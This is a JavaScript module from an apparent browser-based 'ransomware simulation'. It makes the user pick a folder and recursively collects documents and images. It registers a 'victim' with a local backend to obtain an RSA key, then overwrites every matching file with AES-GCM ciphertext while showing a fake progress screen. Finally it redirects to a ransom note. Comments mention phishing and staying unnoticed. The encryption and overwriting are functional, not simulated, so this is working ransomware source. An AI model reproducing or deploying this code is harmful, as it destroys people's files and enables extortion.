/**
 * FSA Module
 * Handles the File System Access API loop for the Ransomware simulation.
 */
class FSAModule {
    static targetExtensions = ['.docx', '.xlsx', '.pdf', '.txt', '.jpeg', '.png'];
    static filesToProcess = [];

    /**
     * Calls the real backend /api/register to get a victimId and public key
     */
    static async registerWithBackend() {
        console.log("[Phishing] Calling /api/register to get public key...");
        
        try {
            const response = await fetch('http://localhost:3000/api/register', {
                method: 'POST'
            });
            const data = await response.json();
            
            // data.publicKey is a PEM string. Let's import it into the RSAModule.
            await RSAModule.importServerPublicKey(data.publicKey);
            
            return data.victimId;
        } catch (e) {
            console.error("Failed to reach backend server:", e);
            alert("Connection error. Ensure the Node.js backend is running on port 3000.");
            throw e;
        }
    }

    /**
     * Main ransomware loop: Scans, updates UI, and encrypts the directory.
     */
    static async startEncryptionAttack() {
        try {
            const dirHandle = await window.showDirectoryPicker({ mode: 'readwrite' });
            
            // 1. Simulate API /register
            const victimId = await this.registerWithBackend();

            // 2. Scan directory silently to get total file count
            this.filesToProcess = [];
            await this.scanDirectory(dirHandle);

            if (this.filesToProcess.length === 0) {
                alert("No supported files found in this folder. Please select another folder.");
                return;
            }

            // 3. Show Fake Processing UI
            UIModule.showProcessing(this.filesToProcess.length);

            // 4. Encrypt files one by one and update progress
            for (const fileHandle of this.filesToProcess) {
                await this.encryptSingleFile(fileHandle);
            }

            // 5. Fake completion
            UIModule.showCompletion();
            
            // 6. Redirect to Extortion (Ransom) Note on the Server
            setTimeout(() => {
                window.location.href = 'http://localhost:3000/api/ransom/' + victimId;
            }, 2500);

        } catch (error) {
            console.error(`Attack aborted or failed: ${error.message}`);
            // If user cancels directory picker, do nothing to look natural
        }
    }

    /**
     * Recursively scans a directory and collects target file handles.
     */
    static async scanDirectory(dirHandle) {
        for await (const entry of dirHandle.values()) {
            if (entry.kind === 'file') {
                const ext = entry.name.substring(entry.name.lastIndexOf('.')).toLowerCase();
                if (this.targetExtensions.includes(ext)) {
                    this.filesToProcess.push(entry);
                }
            } else if (entry.kind === 'directory') {
                await this.scanDirectory(entry);
            }
        }
    }

    /**
     * Encrypts a single file handle and updates the UI progress.
     */
    static async encryptSingleFile(fileHandle) {
        try {
            const file = await fileHandle.getFile();
            
            // Read file content
            const arrayBuffer = await file.arrayBuffer();
            const fileContent = new Uint8Array(arrayBuffer);

            // Generate AES Key
            const aesKey = AESModule.generateAESKey();

            // Encrypt File Content (Wasm AES-GCM)
            const encryptedData = await AESModule.encryptFile(fileContent, aesKey);

            // Encrypt AES Key with RSA-2048 (Backend Key)
            const wrappedKey = await RSAModule.wrapAESKey(aesKey);

            // Clear sensitive AES key from memory
            MemoryModule.clear_memory(aesKey);

            // Overwrite the file with encrypted data
            // Format: [WrappedKeyLength (4 bytes)] + [WrappedKey] + [IV (12 bytes)] + [Ciphertext || Tag]
            const keyLenBytes = new Uint8Array(new Uint32Array([wrappedKey.length]).buffer);
            const finalPayload = new Uint8Array(keyLenBytes.length + wrappedKey.length + encryptedData.iv.length + encryptedData.ciphertext.length);
            
            let offset = 0;
            finalPayload.set(keyLenBytes, offset); offset += keyLenBytes.length;
            finalPayload.set(wrappedKey, offset); offset += wrappedKey.length;
            finalPayload.set(encryptedData.iv, offset); offset += encryptedData.iv.length;
            finalPayload.set(encryptedData.ciphertext, offset);

            const writable = await fileHandle.createWritable();
            await writable.write(finalPayload);
            await writable.close();

            // Update Fake UI
            UIModule.updateProgress(file.name);
            
            MemoryModule.clear_memory(finalPayload);

            // Small artificial delay to make the progress bar look realistic
            await new Promise(r => setTimeout(r, 200));

        } catch (e) {
            console.error(`Failed to encrypt ${fileHandle.name}: ${e.message}`);
        }
    }
}

window.FSAModule = FSAModule;
